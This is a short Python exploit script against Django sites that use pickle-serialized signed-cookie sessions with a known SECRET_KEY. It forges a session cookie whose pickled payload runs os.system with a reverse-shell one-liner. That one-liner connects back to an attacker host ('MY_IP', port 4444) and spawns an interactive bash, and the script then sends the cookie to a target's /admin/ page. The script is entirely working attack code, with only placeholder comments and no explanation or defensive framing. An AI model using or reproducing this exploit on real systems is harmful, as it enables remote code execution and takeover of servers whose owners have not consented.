import os
from django.core import signing
import requests
from django.contrib.sessions.serializers import PickleSerializer
from django.conf import settings

settings.configure(SECRET_KEY='SECRET_KEY')
lhost="MY_IP"
lport=4444 #You can change this if you want

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ((f"""python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &"""),))

cookie = signing.dumps(Shell_code(),
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True)
print(cookie)

response = requests.get('http://TARGET_SERVER.COM/admin/', cookies=dict(sessionid=cookie)) #Change the target appropriately
print(response.status_code)
